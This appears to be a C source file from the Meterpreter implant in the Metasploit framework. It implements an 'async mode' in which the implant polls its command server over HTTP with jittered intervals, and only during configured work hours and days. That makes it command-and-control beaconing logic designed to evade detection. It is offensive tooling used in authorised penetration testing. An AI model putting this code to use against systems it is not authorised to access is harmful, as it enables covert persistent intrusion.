/*!
 * @file core_async.c
 * @brief Handles the core async mode command for HTTP transports.
 */
#include "metsrv.h"

/*!
 * @brief Determine if the current local hour falls within business hours on an active day.
 * @param ctx Pointer to the HTTP transport context containing async config.
 * @returns TRUE if currently within configured work hours, FALSE otherwise.
 */
BOOL async_in_work_hours(HttpTransportContext* ctx)
{
	SYSTEMTIME st;
	GetLocalTime(&st);

	// Check if today is an active day (bit 0 = Sunday, bit 6 = Saturday)
	if (ctx->async_work_days != 0)
	{
		UINT dayBit = 1 << st.wDayOfWeek;
		if (!(ctx->async_work_days & dayBit))
		{
			return FALSE;
		}
	}

	// Check if current hour is within work hours
	if (ctx->async_work_start < ctx->async_work_end)
	{
		// Normal range, e.g. 8-17
		if (st.wHour < ctx->async_work_start || st.wHour >= ctx->async_work_end)
		{
			return FALSE;
		}
	}
	else if (ctx->async_work_start > ctx->async_work_end)
	{
		// Overnight range, e.g. 22-6
		if (st.wHour >= ctx->async_work_end && st.wHour < ctx->async_work_start)
		{
			return FALSE;
		}
	}
	// If start == end, treat as 24h (always active)

	return TRUE;
}

/*!
 * @brief Calculate the sleep duration in milliseconds for the current async poll cycle.
 * @param ctx Pointer to the HTTP transport context containing async config.
 * @returns Sleep duration in milliseconds with jitter applied.
 */
DWORD async_calculate_sleep_ms(HttpTransportContext* ctx)
{
	DWORD intervalMs = ctx->async_poll_interval * 1000;

	if (ctx->async_poll_jitter > 0 && ctx->async_poll_jitter < 100)
	{
		// Apply jitter: interval ± jitter%
		DWORD jitterRange = (intervalMs * ctx->async_poll_jitter) / 100;
		// Random value in range [0, 2*jitterRange], then shift to [-jitterRange, +jitterRange]
		DWORD randVal;
		if (jitterRange > 0)
		{
			randVal = (DWORD)(rand() % (2 * jitterRange + 1));
			intervalMs = intervalMs - jitterRange + randVal;
		}
	}

	return intervalMs;
}

/*!
 * @brief Handle the COMMAND_ID_CORE_ASYNC_MODE request.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_core_async_mode(Remote* remote, Packet* packet)
{
	Packet* response = met_api->packet.create_response(packet);
	DWORD result = ERROR_SUCCESS;
	Transport* transport = remote->transport;

	// Async mode is only supported on HTTP transports
	if (!(transport->type & METERPRETER_TRANSPORT_HTTP))
	{
		dprintf("[ASYNC] Async mode is only supported on HTTP transports");
		result = ERROR_NOT_SUPPORTED;
	}
	else
	{
		HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

		BOOL enabled = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_ASYNC_ENABLED);
		ctx->async_mode = enabled;

		if (enabled)
		{
			UINT pollInterval = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_POLL_INTERVAL);
			UINT pollJitter = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_POLL_JITTER);
			UINT workStart = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_START);
			UINT workEnd = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_END);
			UINT workDays = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_DAYS);

			// Apply poll interval (minimum 10 seconds to avoid spin)
			if (pollInterval >= 10)
			{
				ctx->async_poll_interval = pollInterval;
			}
			else if (pollInterval > 0)
			{
				ctx->async_poll_interval = 10;
			}
			else
			{
				// Default to 300 seconds if not specified
				ctx->async_poll_interval = 300;
			}

			// Jitter must be 0-99
			if (pollJitter < 100)
			{
				ctx->async_poll_jitter = pollJitter;
			}
			else
			{
				ctx->async_poll_jitter = 0;
			}

			// Work hours (0-23, end also accepts 24 meaning midnight)
			ctx->async_work_start = (workStart <= 23) ? workStart : 0;
			ctx->async_work_end = (workEnd <= 24) ? workEnd : 0;

			// Work days bitmask (7 bits: bit0=Sun..bit6=Sat)
			ctx->async_work_days = workDays & 0x7F;

			// Create the wake event (auto-reset) so sleeps can be interrupted
			if (ctx->async_wake_event == NULL)
			{
				ctx->async_wake_event = CreateEvent(NULL, FALSE, FALSE, NULL);
			}

			dprintf("[ASYNC] Async mode enabled: interval=%us, jitter=%u%%, hours=%u-%u, days=0x%02X",
				ctx->async_poll_interval, ctx->async_poll_jitter,
				ctx->async_work_start, ctx->async_work_end, ctx->async_work_days);
		}
		else
		{
			dprintf("[ASYNC] Async mode disabled");

			// Signal the wake event to interrupt any in-progress async sleep
			if (ctx->async_wake_event != NULL)
			{
				SetEvent(ctx->async_wake_event);
				CloseHandle(ctx->async_wake_event);
				ctx->async_wake_event = NULL;
			}

			ctx->async_poll_interval = 0;
			ctx->async_poll_jitter = 0;
			ctx->async_work_start = 0;
			ctx->async_work_end = 0;
			ctx->async_work_days = 0;
		}

		met_api->packet.add_tlv_bool(response, TLV_TYPE_ASYNC_ENABLED, ctx->async_mode);
	}

	met_api->packet.transmit_response(result, remote, response);

	return result;
}
